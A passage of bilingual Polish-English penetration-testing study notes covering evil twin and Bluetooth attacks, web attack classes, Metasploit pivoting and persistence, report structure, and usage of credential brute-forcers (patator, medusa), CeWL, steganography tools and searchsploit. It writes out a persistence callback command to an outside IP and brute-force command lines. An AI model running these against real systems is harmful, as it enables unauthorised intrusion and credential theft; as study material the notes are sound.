is a Python library and standalone program that enables users to send, sniff, dissect, and forge network packets. It can be installed using pip or the relevant package manager for your platform. We can scan, traceroute, probe, attack, and discover networks using Scapy. Imagine replacing hping, arpspoof, arping, tcpdump, tshark, p0f, and most of nmap with just one program.</p>
<h3 id="ataki-evil-twin-i-captive-portal">Ataki Evil Twin i Captive Portal</h3>
<p><strong>Evil Twin</strong> tworzony jest fałszywy Acces Point z takim samym SSID jak prawdziwy, atakujący rozpoczyna deautentykację (atak polegający na ) użytkownika podłączonego do prawdziwego AP, rozgłaszając ramkę deauth do użytkownika, zmuszając go do odłączenia się od prawdziwego punktu dostępowego. podszywające się pod AP urządzenie jest wtedy albo fizycznie zlokalizowany bliżej użytkownika niż prawdziwy AP, albo nadaje swój sygnał z większą siłą niż prawdziwy AP. Urządzenie użytkownika albo automatycznie połączy się ze złym bliźniakiem, ponieważ ma znany identyfikator SSID, albo po odłączeniu od legalnego punktu dostępu użytkownik uzyska dostęp do listy dostępnych punktów dostępu i połączy się ze znajomym identyfikatorem SSID. Może to następnie skłonić użytkownika do uwierzytelnienia, w którym to momencie atakujący może ukraść hasło do prawdziwego AP, umożliwiając atakującemu bezpośrednie połączenie z prawdziwym AP.
BSSID -adres MAC AP
ESSID -network name, user identify network</p>
<p>One common tactic that follows on from an evil twin attack is to present the user with a captive portal. A captive portal is a web page to which a client is redirected when they connect to a guest SSID. The client can gain access to the internet after they successfully authenticate or accept the terms of use on the portal page. Captive portals will be familiar to anyone that uses Wi‑Fi offered in public places, including hotels, transport hubs, and coffee shops. If we can trick the user into thinking that they need to reauthenticate after momentarily being disconnected from the network, we can capture those credentials and use them to gain access to the target network.</p>
<h3 id="pixie-dust-attack">Pixie Dust Attack</h3>
<h3 id="bluetooth-attacks">Bluetooth Attacks</h3>
<p><strong>Bluejacking</strong> involves sending unsolicited messages over Bluetooth to other Bluetooth‑enabled devices. It’s essentially a form of spam. It requires a target device to have Bluetooth enabled and to be discoverable. No harm in so far as the attacker gains no control over the device and can’t access any sensitive information, but it’s considered an attack against integrity because it abuses the trust relationship between the two devices. programy: BlueSpam, Freejack and eJack
<strong>Bluesnarfing</strong> is the theft of information from Bluetooth‑enabled devices. It relies on exploiting a vulnerability in the object exchange, or OBEX, protocol. OBEX enables the exchange of data between connected devices, but most of its subservices don’t require any authentication to validate the device sending or receiving the data. The original developers of Bluetooth technology consciously implemented the OBEX protocol without authentication policies in place like asking for a PIN or a paring request in order to ease the sharing of digital business cards. Kali includes the <strong>Bluesnarfer</strong> package, which allows phonebook contact theft via Bluetooth given a device ID or address, and <strong>Bluediving</strong>, which implements several attacks, including BlueBug, BlueSnarf, BlueSnarf++, and BlueSmack. Unless the hacker has specialized equipment, they must be within 30 ft or 10 m of the victim’s phone for the attack to succeed. Bluesniping is a type of Bluesnarfing in which the hacker uses equipment to increase the range of the paired phone, allowing it to attack devices that are located farther away than the standard Bluetooth range.
inne ataki: <strong>Bluebugging</strong>, <strong>CarWhispere</strong> (podatność w sytemach bt aut), <strong>BlueBorne</strong> (ifect with malware),</p>
<h3 id="rfid-cloning">RFID Cloning</h3>
<h2 id="application-attacks">Application attacks</h2>
<h3 id="server-side-request-forgery">Server-side Request Forgery</h3>
<ul>
<li>Blind SSRF attacks</li>
<li>Hidden SSRF vulnerabilities
<ul>
<li>Partial URLs in requests</li>
<li>URLs within data formats</li>
<li>SSRF via referral headers</li>
</ul>
</li>
</ul>
<h3 id="injection-attacks">Injection Attacks</h3>
<p>Blind SQL Injection: Content-based blind SQLi, Timing-based blind SQLi
Cross Site Scripting (XSS): <strong>Reflected</strong> (from current HTTP request), Persistent/<strong>stored</strong> (from database that support app), Dom-based</p>
<h3 id="cross-site-request-forgery-and-unsecure-code-practices">Cross-site Request Forgery and Unsecure Code Practices</h3>
<p><img src="/_resources/bfd72e83b564450795275a164218ea76.png" /></p>
<h3 id="authentication-and-authorization-vulnerabilities">Authentication and Authorization Vulnerabilities</h3>
<p><strong>Authentication Attacks</strong>: Password authentication, <strong>Session hijacking</strong>, <strong>Unvalidated redirects</strong>
<img src="/_resources/25d1a13894f8427e891ecfa840fc1f72.png" />
<img src="/_resources/42e244f1188e46298e795aae79faba60.png" />
<strong>Authorization Vulnerabilities</strong>: Direcotry Traversal, Local/Remote File Inclusion, Insecure Direct Object References,  <img src="/_resources/cbd8b0962fb54d188a59df03156ea18f.png" />
Local File Inclusion
<img src="/_resources/674e79b13e7d4c738e0b6dcc5a9b524a.png" />
Remote File Inclusion
<img src="/_resources/f61e879a9f0d45ee8c1c6a56402192a2.png" />
<img src="/_resources/f5d4e5b091744262ba555faecf3ab68c.png" /></p>
<h3 id="api-attacks">API Attacks</h3>
<h2 id="attacks-against-cloud-technologies">Attacks against cloud technologies</h2>
<p><img src="/_resources/b01883120acc49a98ea632c640978c74.png" /></p>
<h2 id="attacking-and-exploiting-specialized-systems">Attacking and exploiting specialized systems</h2>
<p><strong>The Browser Exploitation Framework (BeEF)</strong>
kiedy ofiara jest zaatakowana pozwala przejąć całkowicie kontrolę nad przeglądarką, binduje przegląðarkę ofiary z serwerem beef
dostaje się <em>hook</em> w postaci skryptu, który zamieszcza się na swojej stronie</p>
<h2 id="social-engineering-and-physical-attacks">Social engineering and physical attacks</h2>
<h2 id="post-exploitation">Post-exploitation</h2>
<h1 id="5-post-exploitation">5. Post Exploitation</h1>
<h2 id="programy">Programy</h2>
<h3 id="powershell-empire">PowerShell Empire</h3>
<h3 id="mimikatz">Mimikatz</h3>
<h3 id="bloodhound">Bloodhound</h3>
<h3 id="powershell-i-linux-terminal">Powershell i Linux Terminal</h3>
<h2 id="enumeration">Enumeration</h2>
<p>Użytkownicy i grupy, informacje o systemie, usługi i działające procesy, interfejsy sieciowe, security features</p>
<h2 id="lateral-movement">Lateral movement</h2>
<p>Alternate authenttication types
PSExec &gt; msf exploit/windows/smb/psexec
SSHExec &gt; msf exploit/multi/ssh/sshexec
Incognito</p>
<h3 id="pivoting">Pivoting</h3>
<p>Adding a route in Metasploit
Socks4A and ProxyChains:</p>
<div><pre class="hljs"><code>msf &gt; use auxiliary<span class="hljs-regexp">/server/</span>socks4a
proxychains nmap ...</code></pre></div>
<h3 id="privilege-escalation">Privilege Escalation</h3>
<p>Exploitation: msf &gt; two key techniques, the first is get system which tries a number of different techniques such as name to pipe impersonation or token duplication, second class of techniques is local exploits - take advantage of known published vulnerabilities in common operating systems and components.
Hijack the flow of code execution. - dll w windows ładowane w pewnej kolejności można utworzyć wcześniej spreparowanego dll-a i umieśćić go w miejscu wyżej na liście</p>
<h3 id="persistance">Persistance</h3>
<p>Metasploit: run persistance -r 192.16.2.121 -p 4444 -U
Adding user
Scheduling tasks on Windows, inux (cron)</p>
<h1 id="6-reporting-and-communication">6. Reporting and Communication</h1>
<p>Jakie punkty powinny znaleźć się w raporcie z przeprowadzonych testów. Znaleźć templatki raportów.</p>
<h2 id="przykładowy-układ">Przykładowy układ</h2>
<p><img src="/_resources/c7b39f8092ef41c8a0c12470df7550af.png" /></p>
<h2 id="opis-znalezionej-podatności-findings-and-recommendations">Opis znalezionej podatności (Findings and Recommendations)</h2>
<p><img src="/_resources/a43a9d23b92b4ae497502a4ca08ada80.png" /></p>
<h2 id="wpływ-na-biznes-business-impact">Wpływ na biznes (Business Impact)</h2>
<p><img src="/_resources/ec5616518bf5464483d23b0e64932fe6.png" /></p>
<h2 id="rekomendacje-recommendation">Rekomendacje (Recommendation)</h2>
<p><img src="/_resources/c0bbb0ad8fee424180b2fa9b61791431.png" /></p>
<h2 id="podsumowanie">Podsumowanie</h2>
<p><img src="/_resources/4f901d73fbc84d439bbc200635a390ae.png" />
<img src="/_resources/63cfc7f1ba3e482ab5fe411fdd1c3e8e.png" /></p>
<p>Raport jest instrukcją jak shakować firmę, nie przesyłąć go kanałami niezaszyfrowanymi, nie udostępniać</p>
<h1 id="tools-and-code-analysis">Tools and Code Analysis</h1>
<h2 id="reconnaissance-to-discovery">Reconnaissance to Discovery</h2>
<h3 id="whois">WHOIS</h3>
<p>WHOIS system is a listing of records that contain details about the ownership of domains and the technical details, such as the DNS servers. Anyone essentially can query a domain.
Rejestr - <em>Registry</em> is a company that manages a list containing a set of domain names
Rejestrujący - <em>Registrant</em> is the legal owner of the domain,
Rejestrator -<em>Registrar</em> is a company that the registrant could use to register the domain.</p>
<div><pre class="hljs"><code><span class="hljs-attribute">whois</span> chylak.com</code></pre></div>
<h3 id="dns">DNS</h3>
<p><a title="https://securitytrails.com/stats" href="https://securitytrails.com/stats">https://securitytrails.com/stats</a> # można sprawdzić stronę (DNS, rekordy, itd.)</p>
<div><pre class="hljs"><code>dig @<span class="hljs-number">8.8</span><span class="hljs-number">.8</span><span class="hljs-number">.8</span> chylak.com <span class="hljs-keyword">ANY</span> 
# @<span class="hljs-number">8.8</span><span class="hljs-number">.8</span><span class="hljs-number">.8</span> - użyj konkretnego serwera DNS [nie wymagane]
# chylak.com  - domena <span class="hljs-keyword">do</span> sprawdzenia
# <span class="hljs-keyword">ANY</span> - <span class="hljs-keyword">all</span> DNS records/ MX- mail serwer - <span class="hljs-type">record</span> <span class="hljs-keyword">type</span></code></pre></div>
<h3 id="scaning-with-wapiti">scaning with wapiti</h3>
<p>przyjżeć się jeszcze</p>
<div><pre class="hljs"><code>wapiti -<span class="hljs-keyword">u</span> http:///chylak.<span class="hljs-keyword">com</span> -<span class="hljs-keyword">m</span> <span class="hljs-keyword">all</span>
# -<span class="hljs-keyword">u</span> http:///chylak.<span class="hljs-keyword">com</span> -url strony
# -<span class="hljs-keyword">m</span> <span class="hljs-keyword">all</span> -moduł<span class="hljs-keyword">y</span> <span class="hljs-keyword">do</span> załadowania</code></pre></div>
<h2 id="web-scanners">Web Scanners</h2>
<h3 id="nessus">nessus</h3>
<p>kombajn do skanowania</p>
<h3 id="nikto-2">nikto</h3>
<p>open‑source web server scanner, which you can use to obtain comprehensive results on your targeted web server.
It has the ability to highlight security misconfiguration, vulnerabilities, interesting directories, and a lot more.
It’s important to note that <strong>Nikto is not a stealthy tool</strong>.</p>
<h3 id="wpscan-2">WPScan</h3>
<p>skanowanie stron WordPress</p>
<h3 id="sqlmap">SQLMap</h3>
<h2 id="credential-testing">Credential Testing</h2>
<h3 id="cewl-get-word-list">CeWL (get word list)</h3>
<p>create custom word lists, crawl a URL that can produce a list of keywords that can be used with password crackers like John the Ripper to create password lists</p>
<div><pre class="hljs"><code># pobierz listę słów ze strony
cewl &lt;http:<span class="hljs-comment">//127.0.0.1&gt; -v -d &lt;int&gt; --with-numbers --ua &lt;"user agent"&gt; -c </span>
# &lt;http:<span class="hljs-comment">//127.0.0.1&gt; adres strony, z której pobierane są słowa</span>
# -v verbose mode, więcej słów
# -d &lt;int&gt;  Depth to spider to, default <span class="hljs-number">2</span>
# --<span class="hljs-keyword">with</span>-numbers Accept words <span class="hljs-keyword">with</span> numbers <span class="hljs-keyword">in</span> <span class="hljs-keyword">as</span> well <span class="hljs-keyword">as</span> just letters
# --ua &lt;<span class="hljs-string">"user agent"</span>&gt;
# -c Show the count for each word found</code></pre></div>
<h3 id="patator-creds-bruteforcing-various-services">patator (creds bruteforcing, various services)</h3>
<p><a title="https://github.com/lanjelot/patator" href="https://github.com/lanjelot/patator">https://github.com/lanjelot/patator</a>
very noisy
Patator was written out of frustration from using Hydra, Medusa, Ncrack, Metasploit modules and Nmap NSE scripts for password guessing attacks</p>
<div><pre class="hljs"><code>patator -h # pokaż dostępne moduły
patator &lt;moduł &gt;-h # pokaż dostępne opcje dla modułu
patator rdp_login <span class="hljs-attribute">host</span>=&lt;IP&gt; <span class="hljs-attribute">user</span>=FILE0 <span class="hljs-attribute">password</span>=FILE1 <span class="hljs-attribute">0</span>=&lt;logins.txt&gt; <span class="hljs-attribute">1</span>=&lt;passwords.txt&gt; ignore:<span class="hljs-attribute">mesg</span>=<span class="hljs-string">'Authentication failed.'</span>
<span class="hljs-comment"># rdp_login odpowiedni moduł</span>
<span class="hljs-comment"># host=&lt;IP&gt; adres hosta</span>
<span class="hljs-comment"># user=FILE0 użyj pliku z loginami, jeśli zna się dokładnie dane to nie trzeba dawać pliku, tylko podaje się login</span>
<span class="hljs-comment"># password=FILE1 użyj pliku z hasłami, jeśli zna się dokładnie dane to nie trzeba dawać pliku, tylko podaje się hasło</span>
<span class="hljs-comment"># 0=&lt;logins.txt&gt; plik tekstowy z loginami</span>
<span class="hljs-comment"># 1=&lt;passwords.txt&gt; plik tekstowy z hasłami</span>
<span class="hljs-comment"># ignore:mesg='Authentication failed.' ignoruj wiadomośći 'Authentication failed'</span></code></pre></div>
<h3 id="medusa-creds-bruteforcing">medusa (creds bruteforcing)</h3>
<div><pre class="hljs"><code>medusa -d <span class="hljs-comment">#	pokaż dostępne moduły</span>
medusa [-h host|-H <span class="hljs-built_in">file</span>] [-u username|-U <span class="hljs-built_in">file</span>] [-p password|-P <span class="hljs-built_in">file</span>] [-C <span class="hljs-built_in">file</span>] -M module [OPT]
medus -U /dev/<span class="hljs-literal">null</span>/users.txt -P /dev/<span class="hljs-literal">null</span>/passwords.txt <span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span> -M <span class="hljs-keyword">ftp</span>
<span class="hljs-comment"># -d dostępne moduły, co można bruteforcować</span>
<span class="hljs-comment"># -h [TEXT]    : Target hostname or IP address</span>
<span class="hljs-comment"># -H [FILE]    : File containing target hostnames or IP addresses</span>
<span class="hljs-comment"># -u [TEXT]    : Username to test</span>
<span class="hljs-comment"># -U [FILE]    : File containing usernames to test</span>
<span class="hljs-comment"># -p [TEXT]    : Password to test</span>
<span class="hljs-comment"># -P [FILE]    : File containing passwords to test</span>
<span class="hljs-comment"># -C [FILE] File  containing  combo  entries. Combo files are colon separated and in the following format: host:user:password. If any of the three fields are left empty, the respective information should be provided either as a single global value or as a list in a file.</span>

</code></pre></div>
<h2 id="wireless-attacks">Wireless Attacks</h2>
<h2 id="web-application-testing">Web Application Testing</h2>
<h2 id="steganography-data-exfiltration">Steganography - Data Exfiltration</h2>
<h3 id="stegsnow">StegSnow</h3>
<p>whitespace steganography
ukrywa tają wiadomość w plikach tekstowych przy pomocy spacji i tab</p>
<div><pre class="hljs"><code><span class="hljs-comment"># ukrywanie wiadomości</span>
stegsnow -C -m 'wiadomosc' -p <span class="hljs-variable">&lt;password&gt;</span> <span class="hljs-variable">&lt;in.txt&gt;</span> <span class="hljs-variable">&lt;out_encrypt.txt&gt;</span>
<span class="hljs-comment"># odczytywanie wiadomości</span>
stegsnow -C -p <span class="hljs-variable">&lt;password&gt;</span> <span class="hljs-variable">&lt;out_encrypt.txt&gt;</span>
<span class="hljs-comment"># -C compresing data</span>
<span class="hljs-comment"># -m 'wiadomosc' message</span>
<span class="hljs-comment"># -p &lt;password&gt;</span>
<span class="hljs-comment"># &lt;in.txt&gt; plik z tekstem, w którym ukrywamy wiadomość</span>
<span class="hljs-comment"># &lt;&lt;out_encrypt.txt&gt; plik z ukrytym tekstem </span></code></pre></div>
<h3 id="steghide">StegHide</h3>
<p>ukrywa/odczytuje jakiekolwiek dane w/z innego pliku (najczęściej graficznego)</p>
<div><pre class="hljs"><code><span class="hljs-comment"># ukrywanie danych </span>
steghide embed -cf &lt;image.jpg&gt; -ef &lt;data_file&gt;
<span class="hljs-comment"># wydobywanie danych</span>
steghide extract -sf &lt;image.jpg&gt;
<span class="hljs-comment"># --embed umieść dane w obrazie, (-- opcjonale)  </span>
<span class="hljs-comment"># -cf &lt;image.jpg&gt; cover file, plik, w którym ukrywa się dane</span>
<span class="hljs-comment"># -ef &lt;data&gt; embeded file, nie ma restrykcji co do rodzaju danych</span>
<span class="hljs-comment"># -p &lt;hasło&gt;</span>
<span class="hljs-comment"># --extract wyodrębnij dane</span>
<span class="hljs-comment"># -sf &lt;image.jpg&gt; stegofile, plik z ukrytymi danymi</span></code></pre></div>
<h2 id="exploitation">Exploitation</h2>
<h3 id="searchsploit">searchsploit</h3>
<p>szuka dostępnych exploitów na stronie exploitdb
można dać plik xml z nmap</p>
<div><pre class="hljs"><code>nmap -sV <span class="hljs-tag">&lt;IP&gt;</span> -oX out.<span class="hljs-keyword">xml</span>
<span class="hljs-title">searchsploit</span> --nmap out.xml</code></pre></div>
<p>zwraca pełną listę exploitów do tego co znalazł nmap
<a href="https://google.com" class="jop-noMdConv"> daniel </a></p>
</div>
      </article>
    </div>
  </body>
</html>
